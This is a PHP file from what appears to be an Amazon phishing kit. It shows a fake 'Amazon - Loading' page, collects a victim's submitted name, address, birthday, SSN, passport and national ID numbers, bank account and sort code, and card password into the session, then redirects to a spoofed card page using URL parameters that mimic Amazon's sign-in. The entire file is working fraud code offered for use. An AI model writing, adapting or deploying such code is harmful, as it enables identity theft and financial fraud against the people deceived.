<?php
 require_once(dirname(dirname(dirname(__DIR__))).'/autoloader.php');
echo '<title>Amazon - Loading ... </title>';
echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';

/*$_SESSION['nama'] = $nama = $_POST['nm'];
$_SESSION['alamat1'] = $alamat1 = $_POST['aat1'];
$_SESSION['alamat2'] = $alamat2 = $_POST['aat2'];
$_SESSION['kota'] = $kota = $_POST['kta'];
$_SESSION['country'] = $provinsi = $_POST['pnsi'];
$_SESSION['zip'] = $kodepos = $_POST['kpos'];
$_SESSION['negara'] = $negara = $_POST['nara'];
$_SESSION['phone'] = $nomer = $_POST['nomo'];*/
$check = ['nm','aat1','kta','pnsi','kpos','nara','nomo','dob'];
if($core->empty_post_array($check))
{
      $core->redirect('../../ap/bills?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
      exit;
}

$address = $core->post('aat1');
$data  = ['fullname' => $core->post('nm'),
		 'address' => $address,
		 'city' => $core->post('kta'),
		 'state' => $core->post('pnsi'),
		 'postcode' => $core->post('kpos'),
		 'country' => $core->post('nara'),
		 'phone' => $core->post('nomo'),
		 'birthday' => $core->post('dob'),
		'ssn' => $core->post('ssn'),
            'qatarid' => $core->post('qatarid'),
            'idnumber' => $core->post('numbid'),
            'citizenid' => $core->post('citizenid'),
            'nationalid' => $core->post('naid'),
            'sortcode' => $core->post('sortcode'),
            'passport' => $core->post('passcy'),
            'civilid' => $core->post('civilid'),
            'ban' => $core->post('bans'),
            'accno' => $core->post('acno'),
            'climit' => $core->post('climit'),
            'bankaccount' => $core->post('bankaccount'),
            'nabid' => $core->post('nabid'),
            'cardid' => $core->post('cardid'),
            'cardpass' => $core->post('cardpassword')];
$core->create_session($data);


$core->redirect('../../ap/card?openid.pape.max_auth_age='.sha1(time()).'&locale='.@$_GET['locale']);
?>